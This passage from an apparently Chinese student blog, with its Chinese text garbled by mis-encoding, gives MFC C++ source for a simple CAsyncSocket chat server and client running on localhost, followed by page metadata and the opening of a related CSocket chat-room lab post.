123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273// talksDlg.cpp: å®ç°æ–‡ä»¶//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;talks.h&quot;#include &quot;talksDlg.h&quot;#include &quot;afxdialogex.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// ç”¨äºåº”ç”¨ç¨‹åºâ€œå…³äºâ€èœå•é¡¹çš„ CAboutDlg å¯¹è¯æ¡†class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CtalksDlg å¯¹è¯æ¡†CtalksDlg::CtalksDlg(CWnd* pParent /*=nullptr*/) : CDialogEx(IDD_TALKS_DIALOG, pParent) , m_strServName(_T(&quot;&quot;)) , m_nServPort(0) , m_strMsg(_T(&quot;&quot;))&#123; m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);&#125;void CtalksDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_BUTTON_LISTEN, m_btnListen); DDX_Text(pDX, IDC_EDIT_SERVNAME, m_strServName); DDX_Text(pDX, IDC_EDIT_SERVPORT, m_nServPort); DDX_Text(pDX, IDC_EDIT_MSG, m_strMsg); DDX_Control(pDX, IDC_LIST_SENT, m_listSent); DDX_Control(pDX, IDC_LIST_RECEIVED, m_listReceived);&#125;BEGIN_MESSAGE_MAP(CtalksDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON_CLOSE, &amp;CtalksDlg::OnButtonClose) ON_BN_CLICKED(IDC_BUTTON_LISTEN, &amp;CtalksDlg::OnButtonListen) ON_BN_CLICKED(IDOK, &amp;CtalksDlg::OnSendMsg)END_MESSAGE_MAP()// CtalksDlg æ¶ˆæ¯å¤„ç†ç¨‹åºBOOL CtalksDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // å°†â€œå…³äº...â€èœå•é¡¹æ·»åŠ åˆ°ç³»ç»Ÿèœå•ä¸­ã€‚ // IDM_ABOUTBOX å¿…é¡»åœ¨ç³»ç»Ÿå‘½ä»¤èŒƒå›´å†…ã€‚ ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // è®¾ç½®æ­¤å¯¹è¯æ¡†çš„å›¾æ ‡ã€‚ å½“åº”ç”¨ç¨‹åºä¸»çª—å£ä¸æ˜¯å¯¹è¯æ¡†æ—¶ï¼Œæ¡†æ¶å°†è‡ªåŠ¨ // æ‰§è¡Œæ­¤æ“ä½œ SetIcon(m_hIcon, TRUE); // è®¾ç½®å¤§å›¾æ ‡ SetIcon(m_hIcon, FALSE); // è®¾ç½®å°å›¾æ ‡ // TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç  m_strServName = &quot;localhost&quot;; m_nServPort = 1000; UpdateData(FALSE); m_sListenSocket.SetParent(this); m_sConnectSocket.SetParent(this); return TRUE; // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE&#125;void CtalksDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// å¦‚æœå‘å¯¹è¯æ¡†æ·»åŠ æœ€å°åŒ–æŒ‰é’®ï¼Œåˆ™éœ€è¦ä¸‹é¢çš„ä»£ç // æ¥ç»˜åˆ¶è¯¥å›¾æ ‡ã€‚ å¯¹äºä½¿ç”¨æ–‡æ¡£/è§†å›¾æ¨¡å‹çš„ MFC åº”ç”¨ç¨‹åºï¼Œ// è¿™å°†ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆã€‚void CtalksDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // ç”¨äºç»˜åˆ¶çš„è®¾å¤‡ä¸Šä¸‹æ–‡ SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // ä½¿å›¾æ ‡åœ¨å·¥ä½œåŒºçŸ©å½¢ä¸­å±…ä¸­ int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // ç»˜åˆ¶å›¾æ ‡ dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//å½“ç”¨æˆ·æ‹–åŠ¨æœ€å°åŒ–çª—å£æ—¶ç³»ç»Ÿè°ƒç”¨æ­¤å‡½æ•°å–å¾—å…‰æ ‡//æ˜¾ç¤ºã€‚HCURSOR CtalksDlg::OnQueryDragIcon()&#123; return static_cast&lt;HCURSOR&gt;(m_hIcon);&#125;void CtalksDlg::OnButtonClose()&#123; // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  OnClose();&#125;void CtalksDlg::OnButtonListen()&#123; UpdateData(TRUE); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(FALSE); m_sListenSocket.Create(m_nServPort); m_sListenSocket.Listen();&#125;void CtalksDlg::OnSendMsg()&#123; // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  int nLen; int nSent; UpdateData(TRUE); if (!m_strMsg.IsEmpty()) &#123; nLen = m_strMsg.GetLength(); nSent = m_sConnectSocket.Send(LPCTSTR(m_strMsg), nLen); if (nSent != SOCKET_ERROR) &#123; m_listSent.AddString(m_strMsg); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;ä¿¡æ¯å‘é€é”™è¯¯ï¼&quot;, MB_OK | MB_ICONSTOP)); &#125; m_strMsg.Empty(); UpdateData(FALSE); &#125;&#125;void CtalksDlg::OnClose()&#123; m_listReceived.AddString(&quot;æœåŠ¡å™¨å·²ç»æ”¶åˆ°å•¦OnCloseçš„æ¶ˆæ¯â™¥&quot;); m_sConnectSocket.Close(); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); while (m_listSent.GetCount() != 0) m_listSent.DeleteString(0); while (m_listReceived.GetCount() != 0) m_listReceived.DeleteString(0); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(TRUE);&#125;void CtalksDlg::OnAccept()&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . m_listReceived.AddString(&quot;æœåŠ¡å™¨å·²ç»æ”¶åˆ°å•¦OnAcceptçš„æ¶ˆæ¯!!&quot;); m_sListenSocket.Accept(m_sConnectSocket); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(TRUE); &#125;void CtalksDlg::OnReceive()&#123; char *pBuf = new char[1025]; int nBufSize = 1024; int nReceived; CString strReceived; m_listReceived.AddString(&quot;æœåŠ¡å™¨å·²ç»æ”¶åˆ°å•¦OnReceiveçš„æ¶ˆæ¯!!&quot;); nReceived = m_sConnectSocket.Receive(pBuf, nBufSize); if (nReceived != SOCKET_ERROR) &#123; pBuf[nReceived] = NULL; strReceived = pBuf; m_listReceived.AddString(strReceived); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;ä¿¡æ¯æ¥æ”¶å‡ºé”™å•¦ï¼ï¼&quot;, MB_OK | MB_ICONSTOP)); &#125;&#125; å®¢æˆ·ç«¯ï¼š âœï¸talkcDlg.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#if _MSC_VER &gt; 1000#pragma once#endif // _MSC_VER &gt;1000// talkcDlg.h: å¤´æ–‡ä»¶//#include &quot;MySocket.h&quot;#pragma once// CtalkcDlg å¯¹è¯æ¡†class CtalkcDlg : public CDialogEx&#123;// æ„é€ public: void OnClose(); void OnConnect(); void OnReceive(); CMySocket m_sConnectSocket; CtalkcDlg(CWnd* pParent = nullptr); // æ ‡å‡†æ„é€ å‡½æ•°// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TALKC_DIALOG &#125;;#endif CListBox m_listSent; CListBox m_listReceived; CButton m_btnConnect; CString m_strMsg; CString m_strServName; int m_nServPort; protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: HICON m_hIcon; // ç”Ÿæˆçš„æ¶ˆæ¯æ˜ å°„å‡½æ•° virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: afx_msg void OnButtonClose(); afx_msg void OnButtonConnect(); afx_msg void OnSendMsg();&#125;; âœï¸talkcDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273// talkcDlg.cpp: å®ç°æ–‡ä»¶//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;talkc.h&quot;#include &quot;talkcDlg.h&quot;#include &quot;afxdialogex.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// ç”¨äºåº”ç”¨ç¨‹åºâ€œå…³äºâ€èœå•é¡¹çš„ CAboutDlg å¯¹è¯æ¡†class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// å¯¹è¯æ¡†æ•°æ®#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV æ”¯æŒ// å®ç°protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CtalkcDlg å¯¹è¯æ¡†CtalkcDlg::CtalkcDlg(CWnd* pParent /*=NULL*/) : CDialogEx(IDD_TALKC_DIALOG, pParent) , m_strServName(_T(&quot;&quot;)) , m_nServPort(0) , m_strMsg(_T(&quot;&quot;))&#123; m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);&#125;void CtalkcDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_BUTTON_CONNECT, m_btnConnect); DDX_Text(pDX, IDC_EDIT_SERNAME, m_strServName); DDX_Text(pDX, IDC_EDIT_SERVPORT, m_nServPort); DDX_Text(pDX, IDC_EDIT_MSG, m_strMsg); DDX_Control(pDX, IDC_LIST_SENT, m_listSent); DDX_Control(pDX, IDC_LIST_RECEIVED, m_listReceived);&#125;BEGIN_MESSAGE_MAP(CtalkcDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDC_BUTTON_CLOSE, &amp;CtalkcDlg::OnButtonClose) ON_BN_CLICKED(IDC_BUTTON_CONNECT, &amp;CtalkcDlg::OnButtonConnect) ON_BN_CLICKED(IDOK, &amp;CtalkcDlg::OnSendMsg)END_MESSAGE_MAP()// CtalkcDlg æ¶ˆæ¯å¤„ç†ç¨‹åºBOOL CtalkcDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // å°†â€œå…³äº...â€èœå•é¡¹æ·»åŠ åˆ°ç³»ç»Ÿèœå•ä¸­ã€‚ // IDM_ABOUTBOX å¿…é¡»åœ¨ç³»ç»Ÿå‘½ä»¤èŒƒå›´å†…ã€‚ ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // è®¾ç½®æ­¤å¯¹è¯æ¡†çš„å›¾æ ‡ã€‚ å½“åº”ç”¨ç¨‹åºä¸»çª—å£ä¸æ˜¯å¯¹è¯æ¡†æ—¶ï¼Œæ¡†æ¶å°†è‡ªåŠ¨ // æ‰§è¡Œæ­¤æ“ä½œ SetIcon(m_hIcon, TRUE); // è®¾ç½®å¤§å›¾æ ‡ SetIcon(m_hIcon, FALSE); // è®¾ç½®å°å›¾æ ‡ // TODO: åœ¨æ­¤æ·»åŠ é¢å¤–çš„åˆå§‹åŒ–ä»£ç  m_strServName = &quot;localhost&quot;; m_nServPort = 1000; UpdateData(FALSE); GetDlgItem(IDC_BUTTON_CONNECT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(FALSE); m_sConnectSocket.SetParent(this); return TRUE; // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE&#125;void CtalkcDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// å¦‚æœå‘å¯¹è¯æ¡†æ·»åŠ æœ€å°åŒ–æŒ‰é’®ï¼Œåˆ™éœ€è¦ä¸‹é¢çš„ä»£ç // æ¥ç»˜åˆ¶è¯¥å›¾æ ‡ã€‚ å¯¹äºä½¿ç”¨æ–‡æ¡£/è§†å›¾æ¨¡å‹çš„ MFC åº”ç”¨ç¨‹åºï¼Œ// è¿™å°†ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆã€‚void CtalkcDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // ç”¨äºç»˜åˆ¶çš„è®¾å¤‡ä¸Šä¸‹æ–‡ SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // ä½¿å›¾æ ‡åœ¨å·¥ä½œåŒºçŸ©å½¢ä¸­å±…ä¸­ int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // ç»˜åˆ¶å›¾æ ‡ dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//å½“ç”¨æˆ·æ‹–åŠ¨æœ€å°åŒ–çª—å£æ—¶ç³»ç»Ÿè°ƒç”¨æ­¤å‡½æ•°å–å¾—å…‰æ ‡//æ˜¾ç¤ºã€‚HCURSOR CtalkcDlg::OnQueryDragIcon()&#123; return static_cast&lt;HCURSOR&gt;(m_hIcon);&#125;void CtalkcDlg::OnButtonConnect()&#123; // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  UpdateData(TRUE); GetDlgItem(IDC_BUTTON_CONNECT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(FALSE); m_sConnectSocket.Create(); m_sConnectSocket.Connect(m_strServName, m_nServPort);&#125;void CtalkcDlg::OnSendMsg()&#123; // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  int nLen; int nSent; UpdateData(TRUE); if (!m_strMsg.IsEmpty()) &#123; nLen = m_strMsg.GetLength(); nSent = m_sConnectSocket.Send(LPCTSTR(m_strMsg), nLen); if (nSent != SOCKET_ERROR) &#123; m_listSent.AddString(m_strMsg); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;ä¿¡æ¯å‘é€é”™è¯¯ï¼&quot;, MB_OK | MB_ICONSTOP)); &#125; m_strMsg.Empty(); UpdateData(FALSE); &#125;&#125;void CtalkcDlg::OnButtonClose()&#123; // TODO: åœ¨æ­¤æ·»åŠ æ§ä»¶é€šçŸ¥å¤„ç†ç¨‹åºä»£ç  OnClose();&#125;void CtalkcDlg::OnReceive()&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . char *pBuf = new char[1025]; int nBufSize = 1024; int nReceived; CString strReceived; nReceived = m_sConnectSocket.Receive(pBuf, nBufSize); if (nReceived != SOCKET_ERROR) &#123; pBuf[nReceived] = NULL; strReceived = pBuf; m_listReceived.AddString(strReceived); UpdateData(FALSE); &#125; else &#123; AfxMessageBox(_T(&quot;ä¿¡æ¯æ¥æ”¶å‡ºé”™å•¦ï¼ï¼&quot;, MB_OK | MB_ICONSTOP)); &#125;&#125;void CtalkcDlg::OnConnect()&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . //å¼€æ”¾è¿æ¥é…ç½®çš„ç›¸å…³æ§ä»¶ï¼Œå¦‚â€œè¿æ¥â€æŒ‰é’®ã€æœåŠ¡å™¨åç§°ã€ç«¯å£çš„æ–‡æœ¬æ¡†å’Œæ ‡ç­¾ GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(TRUE);&#125;void CtalkcDlg::OnClose()&#123; // TODO: åœ¨æ­¤å¤„æ·»åŠ å®ç°ä»£ç . m_sConnectSocket.Close(); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_STATIC_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); while (m_listSent.GetCount() != 0) m_listSent.DeleteString(0); while (m_listReceived.GetCount() != 0) m_listReceived.DeleteString(0); GetDlgItem(IDC_BUTTON_CONNECT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SERVPORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_STATIC_SERVPORT)-&gt;EnableWindow(TRUE);&#125; å®éªŒç•Œé¢ç»“æœå±•ç¤º å®éªŒè¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜â›”ï¸å…³äºå­—ç¬¦çš„é—®é¢˜ ğŸ’šåœ¨é…ç½®ä¸­è°ƒå±æ€§ï¼Œæˆ–å®å®šä¹‰_T_ã€‚è§£å†³è¯¥æŠ¥é”™ å®éªŒå‚è€ƒä¹¦å®¢æˆ·ç«¯ æœåŠ¡å™¨ç«¯","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç½‘ç»œç¼–ç¨‹","slug":"å®éªŒ/ç½‘ç»œç¼–ç¨‹","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"},{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"},{"name":"CAsyncSocket","slug":"CAsyncSocket","permalink":"https://gryffinbit.top/tags/CAsyncSocket/"}],"author":"Gryffinbit"},{"title":"ç”¨CSocketç±»å®ç°èŠå¤©å®¤ç¨‹åº","slug":"ç”¨CSocketç±»å®ç°èŠå¤©å®¤ç¨‹åº","date":"2020-12-01T11:15:31.000Z","updated":"2024-11-12T06:59:54.000Z","comments":true,"path":"2020/12/01/ç”¨CSocketç±»å®ç°èŠå¤©å®¤ç¨‹åº/","permalink":"https://gryffinbit.top/2020/12/01/%E7%94%A8CSocket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E8%81%8A%E5%A4%A9%E5%AE%A4%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"å®éªŒç›®æ ‡é‡‡ç”¨C&#x2F;Sæ¨¡å‹ï¼Œåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯ç¨‹åºã€‚æœåŠ¡å™¨å¯ä»¥ä¸å¤šä¸ªå®¢æˆ·ç«¯å»ºç«‹è¿æ¥ï¼Œä¸ºå¤šä¸ªå®¢æˆ·æœºæœåŠ¡ã€‚æœåŠ¡å™¨åŠ¨æ€ç»Ÿè®¡è¿›å…¥èŠå¤©å®¤çš„å®¢æˆ·ç«¯æ•°é‡ï¼Œå¹¶æ˜¾ç¤ºã€‚ä¼šæ˜¾ç¤ºè¿›å…¥å’Œé€€å‡ºèŠå¤©å®¤çš„åŠ¨æ€ã€‚ é‡‡ç”¨é“¾è¡¨æ¥ç®¡ç†å®¢æˆ·æœºçš„å¥—æ¥å­—å¯¹è±¡ã€‚ å®éªŒç›®çš„ å­¦ä¹ å¦‚ä½•ä»CSocketç±»æ´¾ç”Ÿå‡ºè‡ªå·±çš„WinSockç±»ã€‚ å­¦ä¹ å¦‚ä½•åˆ©ç”¨CSocketFileç±»ã€CArchiveç±»å’ŒCSocketç±»çš„åˆä½œæ¥å®ç°ç½‘ç»œè¿›ç¨‹ä¹‹é—´çš„æ•°æ®ä¼ è¾“ã€‚ å­¦ä¹ å¦‚ä½•ç”¨é“¾è¡¨ç®¡ç†å¤šä¸ªåŠ¨æ€å®¢æˆ·æœºçš„å¥—æ¥å­—ï¼Œå®ç°æœåŠ¡å™¨å’Œæ‰€æœ‰çš„èŠå¤©å®¢æˆ·æœºæ‰€æ˜¾ç¤ºä¿¡æ¯çš„åŒæ­¥æ›´æ–° å®éªŒç¯å¢ƒWindows10 x64ï¼ŒVisual Studio 2017 å®éªŒå†…å®¹åˆ†ä¸ºä¸¤å¤§å—ï¼Œåˆ›å»ºå®¢æˆ·ç«¯å’Œåˆ›å»ºæœåŠ¡å™¨ç«¯ã€‚ æœåŠ¡å™¨ç«¯ï¼š ä½¿ç”¨MFC ApplicationWizardåˆ›å»ºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºæ¡†æ¶ ä¸ºå¯¹è¯æ¡†ç•Œé¢æ·»åŠ æ§ä»¶å¯¹è±¡ ä¸ºå¯¹è¯æ¡†ä¸­çš„æ§ä»¶å¯¹è±¡å®šä¹‰ç›¸åº”çš„æˆå‘˜å˜é‡ åˆ›å»ºä»CSocketç±»ç»§æ‰¿çš„æ´¾ç”Ÿç±» ä¸ºå¯¹è¯æ¡†ç±»æ·»åŠ æ§ä»¶å¯¹è±¡äº‹ä»¶çš„å“åº”å‡½æ•° ä¸ºCTsDlgå¯¹è¯æ¡†ç±»æ·»åŠ å…¶ä»–çš„æˆå‘˜å‡½æ•°å’Œæˆå‘˜å˜é‡ åˆ›å»ºä¸“ç”¨äºæ•°æ®ä¼ è¾“åºåˆ—åŒ–å¤„ç†çš„ç±»CMsg æ·»åŠ äº‹ä»¶å‡½æ•°å’Œæˆå‘˜å‡½æ•°çš„ä»£ç  å®¢æˆ·ç«¯ï¼šä¸æœåŠ¡å™¨ç«¯åŒç† å®éªŒåŸç†ï¼ˆæ¨¡å‹ï¼‰æœåŠ¡å™¨ç«¯ï¼š åˆ›å»ºç©ºçš„æœåŠ¡å™¨ç›‘å¬å¥—æ¥å­—å¯¹è±¡ 1CSocket sockserv; åˆ›å»ºç›‘å¬å¥—æ¥å­—å¯¹è±¡åº•å±‚å¥æŸ„ 1CLSocket.Create(8000); å¯åŠ¨ç›‘å¬ï¼Œå‡†å¤‡å®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ 1sockServ.Listen(); æ¥æ”¶è¿æ¥ï¼Œè¿›å…¥ä¸å®¢æˆ·æœºçš„ä¼šè¯æœŸã€‚åŠ¨æ€çš„ä¸ºå®¢æˆ·æœºåˆ›å»ºè¿æ¥å¥—æ¥å­—å¯¹è±¡ï¼ˆé‡‡ç”¨é“¾è¡¨æ¥ç®¡ç†å¥—æ¥å­—å¯¹è±¡ï¼‰ 12CSocket sockRecvsockServ.Accept(sockRecv); åˆ›å»ºæ–‡ä»¶å¯¹è±¡å¹¶å…³è”åˆ°å¥—æ¥å­—å¯¹è±¡ 12CSocketFile* m_pFile; //å®šä¹‰ä¸€ä¸ªCSocketFileå¯¹è±¡æŒ‡é’ˆfile = new CSocketFile(&amp;sockRecv); æ¶ˆæ¯çš„ä¼ é€ 1234CArchive* arIn,arOut;arIn = CArchive(&amp;file,CArchive::load); //åˆ›å»ºç”¨äºè¾“å…¥çš„CArchiveå¯¹è±¡arOut = CArchive(&amp;file,CArchive::store); //åˆ›å»ºç”¨äºè¾“å‡ºçš„CArchiveå¯¹è±¡//CArchiveå¯¹è±¡éœ€è¦å…³è”åˆ°æ–‡ä»¶å¯¹è±¡ 12arIn &gt;&gt; dwValue; //è¿›è¡Œæ•°æ®è¾“å…¥adOut &lt;&lt; dwValue; //æ•°æ®è¾“å‡º å…³é—­å¥—æ¥å­— 12sockRecv.Close();sockSecv.Close(); åˆ›å»ºCSocketå¯¹è±¡åˆ†ä¸ºä¸¤æ­¥ï¼š1. è°ƒç”¨CSocketç±»çš„æ„é€ å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªç©ºçš„CSocketå¯¹è±¡ã€‚2. è°ƒç”¨æ­¤CSocketå¯¹è±¡çš„Createï¼ˆï¼‰æˆå‘˜å‡½æ•°ï¼Œåˆ›å»ºå¯¹è±¡çš„åº•å±‚å¥—æ¥å­— å®¢æˆ·ç«¯ï¼š åˆ›å»ºç©ºçš„å®¢æˆ·ç«¯å¥—æ¥å­—å¯¹è±¡ 1CSocket sockClient; 